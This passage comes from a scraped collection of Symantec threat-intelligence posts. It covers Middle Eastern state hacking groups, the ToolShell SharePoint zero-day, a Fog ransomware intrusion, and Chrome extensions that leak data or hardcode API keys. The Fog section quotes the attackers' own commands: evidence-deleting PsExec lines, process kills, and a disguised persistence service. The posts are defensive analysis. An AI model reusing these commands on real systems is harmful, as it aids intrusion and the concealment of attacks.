    "content": "The conflict in the Middle East continues to make headlines, as it has done since the October 7, 2023 Hamas attacks against Israel, which led to Israel retaliating with an ongoing onslaught on the Gaza Strip. The situation heated up further in recent weeks, with Israel and Iran both bombing each other’s territories, leading to U.S. intervention when it bombed Iran’s nuclear facilities, attempting to disrupt or destroy Iran’s nuclear program. Shortly after, U.S. President Donald Trump announced a ceasefire between the two countries, which, at time of writing, appears to be tentatively holding. While most of the attention has focused on the physical actions occurring in this war, such as bombing, aid blockades and destruction, another potential front in the war is cyber space, an increasingly common arena in modern conflicts. Both Israel and Iran, two of the main players in the current hostilities, have a history of carrying out destructive cyber attacks, including against each other. We published a whitepaper last year discussing the cyber activity we typically see emanating from this region titledConflict in the Middle East: An Overview of Cyber Threat Actors and Risks. One of the most infamous cyber incidents to take place in this region was the deployment of the Stuxnet worm, which was designed to break laboratory equipment used by Iranian scientists to enrich uranium at the Natanz facility in Iran. This facility was one of the targets bombed by the U.S. in its recent strikes against Iran. Stuxnet was among the first known major nation-state cyberattacks that demonstrated hackers’ ability to manipulate and even destroy physical equipment. Stuxnet was designed to cause the spinning motors at the bottom of Natanz's enrichment centrifuges to shatter. It was firstpublished about by researchers at Symantec in 2010, after the worm spread outside of the Natanz facility and was found on private networks. Stuxnet has long been suspected to be the work of the U.S. and Israel, though it has never been claimed by either country. Given that Stuxnet was only discovered after penetrating private networks, it is quite possible that cyber operations are currently being leveraged by and against these governments without our knowledge. Recent media reports indicate potential cyber warfare impacting the region, including an attack by pro-Israel hackers dubbed Predatory Sparrow on Iranian crypto exchange Nobitex in whichthe attackers drained $90 million of cryptocurrencyfrom the exchange. There were alsoreportsthat Iranian group Damselfly was carrying out a targeted phishing campaign focused on high-profile Israeli individuals, particularly prominent academics, journalists, and security researchers (See more in Damselfly profile). Damselfly is just one of the key cyber actors who are most likely to be active in the current conflict, potentially targeting the networks of significant institutions in other nations for espionage, disruptive or destructive purposes. We have reasonably good insight into some of the main Iranian actors and their activity. Iranian threat actors have become increasingly proficient in recent years. Not only has their malware improved, but they’ve also developed a strong social engineering capability that they’ve leveraged against targets of interest, even mounting digital honeytrap operations. One of the hallmarks of Iran’s operations in cyberspace is that it periodically mounts destructive attacks against organizations in countries it deems hostile, which at the moment would obviously include the U.S., and its long-standing foe Israel. That creates a risk for organizations in those countries because these attacks are about sending a message rather than stealing information, which means that any organization in the country targeted could be in the firing line. There are a couple of Iranian threat actors worth noting that are among the most active at the moment, the first of which is Seedworm (aka MuddyWater, Temp Zagros, Static Kitten). Seedworm is a long-standing Iranian group, which usually mounts classic espionage attacks for the purposes of spying and information gathering. Active since 2017, CISA said that Seedworm is “a subordinate element within the Iranian Ministry of Intelligence and Security.” Seedworm originally focused on victims in the Middle East but later broadened its scope to target telecommunications, defense, local government, and oil and natural gas organizations in Asia, Africa, Europe, and North America. The group develops its own custom malware as well as using dual-use and living off the land tools. While originally focused on espionage, in recent timesSeedworm has begun either collaborating with another threat group, or else has a sub-group within it, carrying out destructive attacks that masquerade as ransomware. These attacks involve ransomware known as DarkBit and, while it does encrypt computers like regular ransomware, the attackers seem more interested in making a statement than collecting a ransom. Some of the ransom notes they’ve left have had an unusually political tone, implying the ransomware was deployed more as retaliation rather than a money generating exercise. A recent campaign tentatively linked to Seedworm focused on smaller organizations, including organizations in utility, transport, and the manufacturing sector outside the Middle East. The attackers took advantage of compromised home routers that were infected with the Mirai malware. It isn’t clear if this access was purchased or if the infections were initiated by Seedworm itself, but it had access to numerous compromised home routers from which it attacked the victim organizations by proxying through them. These attacks did not come from Iranian IP addresses, they came from small routers in a whole range of countries. Seedworm used this network of hacked routers to scan for vulnerable IIS servers, and used a variety of known vulnerabilities to then gain access to these servers. Once on these servers, it used an off-the-shelf tool, known as Plink, that allowed it to create a reverse RDP tunnel. Plink is a legitimate off-the-shelf tool. RDP inbound connections were blocked by the firewall but Plink is able to create an outbound SSH connection back to the attacker, which is allowed, and that connection is then used to tunnel classic RDP traffic, bypassing the firewall. Seedworm then sideloaded BruteRatel, a commercial red-teaming and adversarial attack simulation tool, and used a scheduled task for persistence. The attackers used Brute Ratel to obtain credentials and once they had them they began to latterly traverse to other machines and ultimately obtained more credentials using reg.exe, by dumping the SAM. Seedworm then gained access to file servers and SQL servers seeking data of interest. It launched SQL injection attacks across the internal network to gain access to the SQL servers. The attackers then installedndisproxyon the web servers to create an attacker-in-the-middle (AITM) attack to exploit and infect actual victims of interest, such as government organizations that visit and use these private organizations’ services. In most cases, they weren’t interested in the infected victim, they were actually interested in using the access as a jumping off point to gain access to another organization. Some of the target organizations held key personal data of victims of interest – for example government officials. The attackers also appeared to be interested in digital certs, which they stole to sign their own tools to use against other organizations. Transportation companies were also among the group’s targets. Iranian attack groups have historically been interested in the transport sector in order to track the movements of both goods and individuals to gain an insight into military equipment and high-value shipments etc, and, in some cases, for the purposes of foreign and domestic intelligence gathering operations. All of the infected organizations in this campaign were SMBs, in a variety of sectors and all based outside the Middle East. None of them were “typical” victims for Iranian threat groups, pointing to a widening scope in victims targeted by Seedworm. Druidfly (aka Homeland Justice, Karma), which specializes in disk-wiping attacks, is another Iranian attack group to be aware of. It first came to public attention after a July 2022 wiper attack on multiple targets belonging to the government of Albania. The wiper left messages directed against the Mujahideen E-Khalq (MEK), an Iranian dissident organization based in Albania. Shortly afterward, a group calling itself Homeland Justice claimed credit for the attack. In response to the attack, Albania broke off diplomatic relations with Iran. This triggered another wave of attacks in September 2022, apparently in retaliation for Albania publicly attributing the attacks to Iran. While Homeland Justice purported to be a hacktivist outfit, the FBI later established that “Iranian state cyber actors” were responsible for the attacks. Druidfly reappeared in 2023, when it began targeting Israel with a wiper called BibiWiper, seemingly named after Israeli Prime Minister Benjamin Netanyahu, whose nickname is “Bibi”(See Case Study). Druidfly is currently active amidst the ongoing conflict and tensions in the region. The Threat Hunter Teamtweeted on June 20, 2025, that we had seen a Druidfly wiper targeting organizations in Albania. The wiper was signed with a legitimate certificate, which was probably stolen. On the Monday following (June 23),it was reported in the media that public services in Albania’s capital Tirana had been disrupted by a cyber attackthat took down the city’s official website and affected local government operations. Homeland Justice claimed credit for the attack and said it had taken down the city’s official website, exfiltrated data and wiped servers, citing the presence of MEK in the country as the reason for the attack. Following the escalation of the conflict in Gaza in 2023, Druidfly was linked to a series of wiper attacks against multiple targets in Israel. In this case, the attacks were carried out under a persona called Karma that purports to be a hacktivist group sympathetic to the Palestinian cause. The wiper deployed in these attacks was called BibiWiper, seemingly named after Israeli Prime Minister Benjamin Netanyahu, whose nickname is Bibi. The wiper encrypted files on the hard disk before overwriting the master boot record (MBR) and crashing the computer. Efforts to restart the computer would fail because of the destruction of the MBR. Analysis of the wiper revealed clear anti-Israel messages within the wiper’s code. Furthermore, analysis of BibiWiper by the Threat Hunter Team found clear similarities between it and wipers deployed by Druidfly during attacks against Albania in 2022 and 2023. Tracing other tools used to initiate the BibiWiper attacks against Israel revealed the following overlap in tactics, techniques, and procedures between these attacks and earlier Druidfly attacks: Damselfly (aka Charming Kitten, Mint Sandstorm) is an Iranian espionage group that has been active since 2014. It was initially known for targeting Israel with attacks before it broadened its focus to include the U.S. and other countries. While the group is principally known to be involved in intelligence gathering, members of the group are also known to have participated in extortion attacks. It has been linked by multiple vendors with Iran’s Islamic Revolutionary Guard Corps (IRGC). In March 2022, Damselfly wasone of several Iranian groups reported to have moved into mounting large-scale social engineering campaigns. Consistent features of these campaigns included the use of charismatic sock puppets, lures of prospective job opportunities, solicitation by journalists, and masquerading as think tank experts seeking opinions. The attackers leveraged networks such as LinkedIn, Facebook, Twitter, and Google. Damselfly has also been linked to an attack targeting a nuclear security expert at a U.S.-based think tank in July 2023; attacks on Israel’s transportation, logistics, and technology sectors in November 2023; as well as a January 2024 campaign targeting individuals working on Middle Eastern affairs at universities and research organizations in Belgium, France, Gaza, Israel, the UK, and the U.S. The attackers in that campaign used bespoke phishing lures themed around the Israel-Hamas conflict to trick targets into downloading malware. Most recently,Check Point reportedthat a new Damselfly campaign that began in mid-June 2025 targeted Israeli journalists, cyber security experts and computer science professors from leading Israeli universities with spear phishing campaigns in an attempt to steal credentials and multi-factor authentication codes in order to gain access to targets’ email accounts. Some of the victims were approached by attackers who posed as fictitious assistants to technology executives or researchers through emails and WhatsApp messages. Active since at least 2014, Mantis (aka Desert Falcon, Arid Viper, APT-C-23), is an Arabic speaking group that appears to be based in the Gaza Strip. The group is known to mount espionage attacks against targets in the government, military, media, financial, research, education, and energy sectors. Most of its attacks have been against organizations in the Middle East but it has, on occasion, attacked targets outside the region. It has also been known on occasion to target individuals or organizations internally within Gaza. Whileother vendors have linked the group to Hamas, the Threat Hunter Team cannot make a definitive attribution to any Palestinian organization. The group mainly favors spear-phishing emails with malicious attachments or links to malicious files as its main infection vector. Mantis uses custom malware and its most recent toolset includes the backdoors Trojan.Micropsia and Trojan.AridGopher. Micropsia is capable of taking screenshots, keylogging, and archiving certain file types using WinRAR in preparation for data exfiltration. However, its main purpose appears to be running secondary payloads for the attackers. Arid Gopher is a modular backdoor that is written in Go. It appears to be regularly updated and rewritten by the attackers, most likely to evade detection. These tools were used in a Mantis attack in late 2022/early 2023 that targeted organizations within the Palestinian territories. The initial infection vector for this campaign remains unknown, but both the Micropsia and AridGopher malware were deployed in this attack. In one intrusion, the attackers deployed three distinct versions of the same toolset (that is, different variants of the same tools) on three groups of computers. Compartmentalizing the attack in this fashion was likely a precautionary measure. If one toolset was discovered, the attackers would still have a persistent presence on the target’s network. If the Mantis operators are based within Gaza it is unlikely the group is operational at the moment given the blockade of the territory by Israel and limited internet access in the region. However, it’s not unusual for members of groups to be based outside the countries or regions they are operating on behalf of, which could be the case for Mantis operators, though we have no evidence of this. As the conflict in the Middle East continues, the types of cyberattacks we are likely to see emanating from Iran, potentially directed at Israel but also against its backers such as the U.S., are probably going to be either espionage or disruption attacks. Seedworm, Damselfly and Druidfly are some of the most likely actors we could see venturing into this conflict, with the groups having the skills and experience to carry out potentially serious and destructive attacks. Iranian actors’ skills at social engineering are something that organizations in Israel, the U.S., and other nations or organizations of interest should be aware of. Iranian threat actors also have a history of carrying out attacks at times when they know organizations' guard may be down - such as at the weekend or during public holidays when activity would be more likely to pass unnoticed for a longer period of time. This was most clearly demonstrated during theShamoon wiping attacksthat targeted organizations in Saudi Arabia in 2012, 2016 and 2018, which mostly began on holidays or weekends. As we head into vacation season for many in the U.S., cyber teams should have their guard up as threat actors may think this quieter time could be a prime opportunity to get a grip on networks and potentially cause major disruption. Learn more about these and other Middle Eastern threat actors in our comprehensive whitepapers: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/cyber-war-middle-east"
  },
  {
    "title": "toolshell zero day sharepoint cve 2025 53770",
    "content": "Update 2025-07-22, 13:23 UTC: Blog has been updated with data on expoitation attempts, Update 2025-07-22, 12:37 UTC: Blog has been updated with additional details about post-exploitation activity. Update 2025-07-21, 10:40 UTC: Blog has been updated with additional indicators of compromise (IOCs). Microsoft has partiallypatched a zero-day vulnerability in SharePointfollowing reports of its exploitation in the wild. The vulnerability (CVE-2025-53770), dubbed ToolShell, affects on-premises SharePoint servers and gives an attacker unauthenticated access to vulnerable servers, allowing them to remotely execute code and access all content and file systems. While the 2019 version of SharePoint Server and SharePoint Server Subscription Edition have been patched, the 2016 version remains unpatched. In its guidance on the vulnerability, Microsoft said it was “aware of active attacks targeting on-premises SharePoint Server customers”. It provided no further information on which actors were behind these attacks. The new zero-day vulnerability is a variant of a recently patched vulnerability,CVE-2025-49704, which was patched in July 2025. Symantec products already block exploitation of this vulnerability with the following network protection: Web Attack: Microsoft SharePoint CVE-2025-49704. A second, related vulnerability (CVE-2025-53771) has also been patched. A path traversal bug, it allows an authorized attacker to perform spoofing over a network. It too is a variant of a recently patched vulnerability (CVE-2025-49706) and the patch includes more robust protections against exploitation of the older flaw. One some networks where post-exploitation activity took place, the attackers first ran an encoded PowerShell command. The attackers then used Certutil to download a file named client.exe (SHA256: fd03d881f0b3069f5adec6ae69181899e72fd27b3e75bb9075d0798ed3184274) from 134.199.202[.]205 and save it as a file named debug.js. PowerShell was used to run commands as below with the –value parameter used to pass commands: The executable was likely renamed as debug.js in order to make it look benign and avoid raising suspicions. It then ran the following batch file located at c:\\\\temp\\\\test.bat: The executable was also used to run the following files: Backup.exe is a renamed variant of WinRAR. It was used to steal cryptographic secrets: In addition to this, Certutil was also used to download a file named agent.x64.exe (SHA256: 04f7326c40c33fda51010d067915a1e50b63e00b4ab86db00158d5e067a78ff6). This was used to launch a file named project1.exe (SHA256 : 430cf700c7f1b625fded4da4084a0a6c0240b15d52e624a2361bc2512ca2355d) In addition to immediately updating to the latest version of SharePoint, the U.S. Cybersecurity and Infrastructure Security Agency (CISA)is advising usersto monitor for POSTs to: Users are also advised to conduct scanning for the following IP addresses: 107.191.58[.]76, 104.238.159[.]149, and 96.9.125[.]147, particularly between July 18-19, 2025. Web Attack: Microsoft SharePoint CVE-2025-49704 For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. fd03d881f0b3069f5adec6ae69181899e72fd27b3e75bb9075d0798ed3184274 04f7326c40c33fda51010d067915a1e50b63e00b4ab86db00158d5e067a78ff6 430cf700c7f1b625fded4da4084a0a6c0240b15d52e624a2361bc2512ca2355d Note: IP addresses are a mixture of IPs scanning for and activity exploiting CVE-2025-53770 The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/toolshell-zero-day-sharepoint-cve-2025-53770"
  },
  {
    "title": "fog ransomware attack",
    "content": "A May 2025 attack on a financial institution in Asia saw the Fog ransomware deployed, alongside an unusual toolset, including some dual-use and open-source pentesting tools we have not observed being used in ransomware attacks previously. The attackers used a legitimate employee monitoring software called Syteca (formerly Ekran), which is highly unusual and not something we have seen used in a ransomware attack chain before. They also deployed several open-source pentesting tools – GC2, Adaptix, and Stowaway – which are not commonly used during ransomware attacks. Also notable in this attack was that, a few days after the ransomware was deployed, the attackers created a service to establish persistence. This is an unusual step to see in a ransomware attack, with malicious activity usually ceasing on a network once the attackers have exfiltrated data and deployed the ransomware, but the attackers in this incident appeared to wish to retain access to the victim’s network. The attackers were on the target’s network for about two weeks before they deployed the ransomware. TheFog ransomware was first documented in May 2024, and initially appeared to be primarily focused on targeting educational institutions in the U.S. In those early attacks, attackers using Fog gained initial access to networks by leveraging compromised VPN credentials. It was reported in October 2024 that attackers using Fogwere targeting a critical vulnerability (CVE-2024-40711 - CVSS 9.8) in the Veeam Backup & Replication (VBR) serversthat was patched in September 2024. Meanwhile, in April 2025, Fog attackers were reported to be using email as an initial infection vector in ransomware attacks in whichthe language used in the ransom notes appeared to be mocking Elon Musk’s Department of Government Efficiency (DOGE) in an effort to goad victims. Also notable in that attack campaign was that the ransom notes also offered a “decrypt for free” option if the victim chose to spread the ransomware to somebody else's computer. The initial infection vector used by the attackers in this recent incident isn't known. Two of the infected machines were Exchange Servers. While there was no evidence to suggest they were the initial infection vector, exploiting vulnerabilities in Exchange Servers is a common initial infection vector for ransomware actors. The first suspicious activity on the network was the installation of multiple open-source, post-exploitation penetration testing tools, including variants of the GC2 tool, which is an open-source tool that allows an attacker to execute commands on target machines using Google Sheets or Microsoft SharePoint List and exfiltrate files using Google Drive or Microsoft SharePoint documents. The GC2 implant polls the Google Sheet or SharePoint List for each operator command, then uses it to store its output, a log, and records the execution polling interval it is configured with. It is used by the attackers for various discovery commands. cmd /c \"ipconfig /all\" cmd /c \"netstat -anot|findstr 3389\" When communicating with the remote attacker, the GC2 tool also checks for the following commands: It contains two embedded configuration blobs in encoded form. This tool is not something we have seen used in ransomware attacks before, though it was used inan attack carried out by Chinese nation-state backed actor APT41in 2023. The open-source Stowaway proxy tool was used to deliver the Syteca (formerly Ekran) executable. It is not clear exactly what the Syteca tool was used for by the attackers. In the attack, the file is named 'sytecaclient.exe', but it also appears with the name 'update.exe.' Syteca islegitimate employee monitoring softwarethat can record onscreen activity and monitor keystrokes, among other capabilities. Several libraries are loaded by this executable, suggesting it was possibly used for information stealing or spying, which would be the most likely reason the attackers would deploy it given the keylogging and screen capture capabilities of the tool. CSIDL_SYSTEM\\regsvr32.exe\" /s /u [REDACTED] Files\\Ekran System\\Ekran System\\Client\\SoundCapture_7.20.576.0.dll\"\" CSIDL_SYSTEM\\regsvr32.exe\" /s /u [REDACTED] Files\\Ekran System\\Ekran System\\Client\\x86\\SoundCapture_7.20.576.0.dll\"\" CSIDL_SYSTEM\\regsvr32.exe\" /s /u [REDACTED] Files\\Ekran System\\Ekran System\\Client\\CredentialProviderWrapper.dll\"\" CSIDL_SYSTEM\\regsvr32.exe\" /s /u [REDACTED] Files\\Ekran System\\Ekran System\\Client\\CredentialProviderWrapper_7.20.576.0.dll\"\" Several commands that look like they are removing or killing the Syteca executable are also executed. This appears to be an attempt by the attackers to delete indicators and evidence of their activity on the network in an effort to avoid detection. CSIDL_SYSTEM\\taskkill.exe /f /im \"EkranClient.exe\" CSIDL_SYSTEM\\taskkill.exe /f /im \"EkranClientSession.exe\" CSIDL_SYSTEM\\taskkill.exe /f /im \"EkranController.exe\" CSIDL_SYSTEM\\taskkill.exe /f /im \"grpcwebproxy.exe\" CSIDL_SYSTEM\\taskkill.exe /f /im \"PamConnectionManager.exe\" CSIDL_SYSTEM_DRIVE\\program files\\ekran system\\ekran system\\tmp\\usbdriverinstaller.exe\" -u [REDACTED] CSIDL_SYSTEM_DRIVE\\program files\\ekran system\\ekran system\\tmp\\usbolddriveruninstaller.exe PsExec was also used to remove the Syteca client configuration file and binary in another attempt by the attackers to delete evidence of the presence of Syteca on the network: psexec64.exe -accepteula \\\\192.168.8.52 -u <?,?> -p <?,?> -h -s cmd /c \"del C:\\users\\public\\SytecaClient.ini\" psexec64.exe -accepteula \\\\192.168.8.150 -u <?,?> -p <?,?> -h -s cmd /c \"rm C:\\users\\public\\SytecaClient.exe\" PsExec and SMBExec were also used alongside Syteca and GC2 for lateral movement across the victim network. SMBExec was used to launch Syteca: cmd.exe /Q /c SytecaClient.exe 1> \\\\127.0.0.1\\ADMIN$\\__1748095766.8385904 2>&1 PsExec was used to laterally execute a suspected process watchdog/launcher for the GC2 backdoor: psexec64.exe -accepteual \\\\192.168.8.52 -u <?,?> -p <?,?> -h -s cmd /c \"CSIDL_COMMON_APPDATA\\microsoft\\devicesync\\windowsdevicesync.exe\" SMBExec and PsExec are both living off the land tools that are commonly used by ransomware attackers: For data theft, the attackers download multiple file transfer utilities - Freefilesync and MegaSync - as well as using 7-zip to archive sensitive directories. Other tools used on the target’s network include the Adaptix C2 Agent Beacon, which is a component of anopen-source extensible post-exploitation and adversarial emulation framework, Adaptix C2, designed for use by penetration testers. The variant used on the target’s network in this incident contained a configuration blob in encrypted form. Adaptix can be considered a sort of open-source alternative to the well-known Cobalt Strike framework. The Adaptix beacon agent is similar to Cobalt Strike beacon; once implanted on a victim machine, it calls back to the attacker and provides command and control (C&C) access. The attackers also used Process Watchdog, a program that continuously enumerates running processes to check for a specific process, in this case the GC2 process, which has the filenameAppxModels.exeand, if not found on a machine, Process Watchdog creates the process. C:\\ProgramData\\Microsoft\\Windows\\Models\\AppxModels.exe On the day the Fog ransomware was deployed, the Impacket SMB tool was also used, suggesting this may have been used to deploy the ransomware. Notably, several days after the ransomware was deployed, a service was run to establish persistence on the victim network. This is likely another process watchdog used to launch one of the attacker’s command and control tools, such as GC2.sc create SecurityHealthIron binPath= \"CSIDL_SYSTEM\\diagsvcs\\runtimebroker.exe\" start= auto DisplayName= \"Collect performance information about an application by using command-line tools.\" sc start SecurityHealthIron There are a few things that mark this ransomware attack out as unusual. The toolset deployed by the attackers is quite atypical for a ransomware attack. The Syteca client and GC2 tool are not tools we have seen deployed in ransomware attacks before, while the Stowaway proxy tool and Adaptix C2 Agent Beacon are also unusual tools to see being used in a ransomware attack. The attackers establishing persistence on a victim network having deployed the ransomware is also not something we would typically see in a ransomware attack. These factors mean it could be possible that this company may in fact have been targeted for espionage purposes, with the ransomware attack merely a decoy, or perhaps also deployed in an attempt by the attackers to make some money while also carrying out their espionage activity. What we can say with certainty is that this was an unusual toolset to see in a ransomware attack and is worth noting for businesses and corporations wanting to guard against attacks by malicious actors. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. 181cf6f9b656a946e7d4ca7c7d8a5002d3d407b4e89973ecad60cee028ae5afa – Fog ransomware 90a027f44f7275313b726028eaaed46f6918210d3b96b84e7b1b40d5f51d7e85 – Process Watchdog f6cfd936a706ba56c3dcae562ff5f75a630ff5e25fcb6149fe77345afd262aab – Process Watchdog fcf1da46d66cc6a0a34d68fe79a33bc3e8439affdee942ed82f6623586b01dd1 – Process Watchdog 4d80c6fcd685961e60ba82fa10d34607d09dacf23d81105df558434f82d67a5e – Likely Process Watchdog 8ed42a1223bfaec9676780137c1080d248af9ac71766c0a80bed6eb4a1b9b4f1 – Likely Process Watchdog e1f571f4bc564f000f18a10ebb7ee7f936463e17ebff75a11178cc9fb855fca4 – Likely Process Watchdog f1c22cbd2d13c58ff9bafae2af33c33d5b05049de83f94b775cdd523e393ec40 – Likely Process Watchdog 279f32c2bb367cc50e053fbd4b443f315823735a3d78ec4ee245860043f72406 – Likely Process Watchdog b448321baae50220782e345ea629d4874cbd13356f54f2bbee857a90b5ce81f6 – Likely Process Watchdog f37c62c5b92eecf177e3b7f98ac959e8a67de5f8721da275b6541437410ffae1 – GC2-sheet 3d1d4259fc6e02599a912493dfb7e39bd56917d1073fdba3d66a96ff516a0982 – GC2-sheet 982d840de531e72a098713fb9bd6aa8a4bf3ccaff365c0f647e8a50100db806d – Likely GC2-sheet fd9f6d828dea66ccc870f56ef66381230139e6d4d68e2e5bcd2a60cc835c0cc6 – Syteca executable bb4f3cd0bc9954b2a59d6cf3d652e5994757b87328d51aa7b1c94086b9f89be0 – Stowaway ba96c0399319848da3f9b965627a583882d352eb650b5f60149b46671753d7dd – Adaptix C2 Beacon Agent 44bb7d9856ba97271d8f37896071b72dfbed2d9fb6c70ac1e70247cddbd54490 – Likely Adaptix C2 Beacon Agent 13d70c27dfa36ba3ae1b10af6def9bf34de81f6e521601123a5fa5b20477f277 – Stowaway amanda[.]protoflint[.]com The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/fog-ransomware-attack"
  },
  {
    "title": "chrome extension leaks",
    "content": "Many users assume that popular Chrome extensions adhere to strong security practices, especially when the extensions themselves promise functionality related to privacy, ranking analytics, or convenient new tab features. However, recent findings show that several widely used extensions—SEMRush Rank, PI Rank, MSN New Tab/Homepage, DualSafe Password Manager,andBrowsec VPN—unintentionally transmit sensitive data over simple HTTP. By doing so, they expose browsing domains, machine IDs, operating system details, usage analytics, and even uninstall information, in plaintext. Because the traffic is unencrypted, a Man-in-the-Middle (MITM) attacker on the same network can intercept and, in some cases, even modify this data, leading to far more dangerous scenarios than simple eavesdropping. This blog illustrates the exact points where these leaks occur, why they are problematic, and how the resulting disclosures can be exploited for profiling, data correlation, or targeted attacks. Two extensions, SEMRush Rank (ID: idbhoeaiokcojcgappfigpifhpkjgmab) with over 30,000 users, and PI Rank (ID: ccgdboldgdlngcgfdolahmiilojmfndl), exhibit identical patterns in their code. Both rely on a service URL of the form shown in Figure 1. The variable “url” corresponds to the user’s currently visited domain. The extensions thus call rank.trellian.com over plain HTTP, appending the entire domain name in the query string. Because HTTP provides no encryption, anyone with the ability to sniff network traffic can read that domain name. On a public Wi-Fi or compromised network, this means user browsing activity is visible to attackers. It is particularly concerning that these extensions are intended to display website rank, which suggests users might frequently engage them, causing repeated unencrypted calls that reveal domains the user is visiting. Browsec VPN (ID: omghfjlpggmjjaagoclmmobgdodcjboh) claims to have more than 6 million users. While it promises a secure and private web experience, its uninstall flow and manifest file illustrate a different story. The extension sets an uninstall URL in the background code. Notice theuninstallURLis chosen based on whether the build is “qa” or not, defaulting to anHTTPendpoint at browsec-uninstall.s3-website.eu-central-1.amazonaws.com. The code then gathers usage statistics (like countryChanges, iconClicks, and others), along with a unique user ID (userId), and appends them as query parameters. Finally, it calls chrome.runtime.setUninstallURL to ensure this plaintext link is opened when the user uninstalls Browsec. Even more revealing is the Browsec VPN manifest, which allows connect-src to a long list of HTTP domains such as http://trafcfy.com and many similar endpoints. This wide array of unsecured hosts suggests the extension is permitted to initiate plain HTTP connections to multiple third-party servers, undermining the expectation that a VPN-focused tool would always encrypt traffic. Because any unencrypted call is susceptible to interception or manipulation, a MITM attacker could hijack these Browsec VPN requests or responses, further jeopardizing user privacy. MSN New Tab (ID: lklfbkdigihjaaeamncibechhgalldgl) with about 500,000 users, and MSN Homepage, Bing Search & News (ID: midiombanaceofjhodpdibeppmnamfcj) with 10,000 users, rely on a function named SendPingDetails. That function, shown in Figure 4, transmits a MachineID and other details over HTTP. This code constructs a URL beginning with and appends parameters for the operating system (OS), the extension’s version (LV), and a unique machine identifier (MI). The MachineID is created by another function, guid, which generates a stable value to represent the user’s device. Because everything is sent in the clear (for example MI=someUniqueId123), it is easy to see how a passive listener on the network can collect that ID. Over time, repeated calls to the same ID can link multiple browsing sessions or physical locations, leading to sophisticated user profiling. The large user base of MSN New Tab in particular raises further concerns, since half a million or more users may be leaking OS details and stable machine IDs with each ping. DualSafe Password Manager & Digital Vault (ID: lgbjhdkjmpgjgcbcdlhkokkckpjmedgc), with around 300,000 users, is another example of an extension sending unencrypted analytics. In the snippet shown in Figure 5, the statistics.getURL method constructs an HTTP-based request. This function eventually causes the extension to make a call to stats.itopupdate.com over plain HTTP. The data includes the extension version, user’s browser language, and usage “type,” among other metrics. Although credentials or passwords do not appear to be leaked, the fact that a password manager uses unencrypted requests for telemetry erodes trust in its overall security posture. Network eavesdroppers or malicious access points can examine these calls to see how the extension is being used and possibly track the user’s environment. DualSafe has since addressed the problem in its latest release, switching the telemetry endpoint to HTTPS and encrypting all transmitted data. All of the previously mentioned extensions make HTTP requests that expose user data in plaintext. While none of them appear to leak direct passwords, the variety of information that does leak includes browsing domains, unique machine IDs, OS details, usage metrics, and even final uninstall parameters. Unencrypted traffic is trivially accessible to anyone performing a Man-in-the-Middle attack, allowing them not only to collect but also to potentially manipulate this data in flight. That data can be combined or correlated by any party who can intercept the connection, including malicious hotspots, internet service providers, and other eavesdroppers. Users of these extensions should consider removing them until the developers address the insecure calls. The risk is not just theoretical; unencrypted traffic is simple to capture, and the data can be used for profiling, phishing, or other targeted attacks. Developers, for their part, should switch to HTTPS whenever they send or receive data, especially if the purpose of their extension is to protect user privacy or provide security-related features. The overarching lesson is that a large install base or a well-known brand does not necessarily ensure best practices around encryption. Extensions should be scrutinized for the protocols they use and the data they share, to ensure users’ information remains truly safe. All of the developers whose extensions were discussed in this blog have been notified about the issues we uncovered. For the latest protection updates, please visit theSymantec Protection Bulletin. Symantec recommends users follow these best practices to stay protected from browser extension threats: Yuanjing is a member of Symantec's Security Technology and Response team who are focused on researching and developing automation technologies in mobile security. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/chrome-extension-leaks"
  },
  {
    "title": "chrome extension credentials",
    "content": "Hardcoded credentials—API keys, secrets, or tokens located directly in a browser extension’s JavaScript—rank among the most significant security oversights in modern development. Once published, these secrets are exposed to anyone who cares to look; an attacker needs only inspect the extension package to extract them. From there, the attacker can craft malicious requests—ranging from spamming analytics with bogus events to commandeering paid cloud services, incurring fees, and undermining user privacy. In this blog, we will examine individual examples drawn from popular Chrome extensions, noting the specific code snippets that reveal each secret and explaining the associated risks. TheAvast Online Security & Privacyextension (7,000,000+ users) andAVG Online Security(600,000+ users) share similar code, each containing a hardcoded Google Analytics 4 (GA4) API secret (Figure 1). Because the secret (GA4_API_SECRET) is appended to the URL, any attacker who discovers it could bombard the GA4 endpoint with spurious events, corrupting metrics or inflating analytics costs.AVG Online Securityreveals a virtually identical pattern in its code. Both extensions demonstrate how embedding a private key in the client code can lead to large-scale data pollution or unauthorized access to analytics resources. With over 5,000,000 users,Equatio – Math Made Digitalembeds an Azure API key used for speech recognition, as seen in Figure 2. Because the key resides in window.equatioAzureApiKey, anyone inspecting or debugging the extension can clearly see it. The code snippet shown in Figure 2 shows thatEquatiocalls fromSubscription(...) with the key to initialize Microsoft Azure’s speech-to-text service. If a malicious user replays or spams these calls, the developer’s Azure subscription could see inflated costs or usage exhaustion. BothAwesome Screen Recorder & Screenshot(3,000,000+ users) andScrolling Screenshot Tool & Screen Capture(400,000+ users) use virtually the same snippet for AWS S3 uploads, exposing the developer’s AWS access key (Figure 3). In both extensions, the embedded key is used to upload screenshots or images to the developer’s S3 bucket. Because the credentials appear in plain text, an attacker could script uploads to the same bucket—potentially hosting illegal content, pushing malicious files, or even pivoting to other AWS resources if the credentials have broader permissions. Essentially, a few lines of JavaScript here undermine the entire AWS environment’s security posture. Microsoft Editor(2,000,000+ users) reveals a telemetry key called StatsApiKey. In the code shown in Figure 4, the extension uses that key to log user data for analytics. Anyone with this key can generate spoofed telemetry data, polluting Microsoft’s analytics and potentially sabotaging any usage insights the developer relies upon. Worse, if the logging system imposes cost or rate limits, mass abuse can drain resources or lock the developer out of their own analytics suite. A significant security risk has been uncovered in over 90 Chrome extensions that use the third-party 